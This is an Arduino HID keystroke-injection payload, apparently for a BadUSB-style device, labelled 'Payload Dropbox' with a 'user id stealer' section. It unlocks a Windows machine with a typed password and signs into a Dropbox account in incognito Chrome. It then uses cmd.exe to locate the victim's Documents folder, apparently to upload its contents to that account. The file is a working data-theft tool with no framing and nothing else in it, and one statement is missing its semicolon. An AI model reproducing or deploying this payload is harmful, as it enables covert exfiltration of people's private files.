//Payload Dropbox

      Keyboard.press(KEY_HOME);
      Keyboard.releaseAll();
      delay(500);
      Keyboard.print(password);
      Keyboard.write('\n');
      Keyboard.releaseAll();
      delay(1000);
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      delay(500);
      Keyboard.print("chrome -incognito");
      Keyboard.write('\n');
      delay(2000);
      Keyboard.print("https://www.dropbox.com/home");
      Keyboard.write('\n');
      Keyboard.write(KEY_F11);
      tabcount = 0;
      delay(5000);
      while(tabcount != 8){
      Keyboard.write(0xB3);
      delay(500);
      tabcount++;
      }
      tabcount = 0;
      delay(200);
      Keyboard.print("@gmail.com"); //Email
      delay(300);
      Keyboard.write(0xB3);
      delay(300);
      Keyboard.print("Password1234"); //Password
      Keyboard.write('\n')
      delay(15000);
      while(tabcount != 30){  
       Keyboard.write(0xB3);
       delay(500);
       tabcount++;
      }
      Keyboard.write('\n');
      delay(2000);
      //user id stealer
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      delay(500);
      Keyboard.print("cmd.exe");
      Keyboard.write('\n');
      delay(2000);
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(KEY_UP_ARROW);
      Keyboard.releaseAll();
      delay(200);
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('c');
      Keyboard.releaseAll();
      delay(300);
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('v');
      Keyboard.releaseAll();
      delay(300);
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('a');
      Keyboard.releaseAll();
      delay(300);
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('c');
      Keyboard.releaseAll();
      delay(300);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(0xB3);
      Keyboard.releaseAll();
      delay(300);
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('v');
      Keyboard.releaseAll();
      delay(300);
      Keyboard.write(KEY_BACKSPACE);
      delay(100);
      Keyboard.write(92);
      delay(100);
      Keyboard.print("Documents");
      delay(100);
      Keyboard.write('\n');
      delay(2000);
      Keyboard.write('\n');
      delay(20000);
      Keyboard.press(0xB3);
      delay(300);
      Keyboard.write('\n');
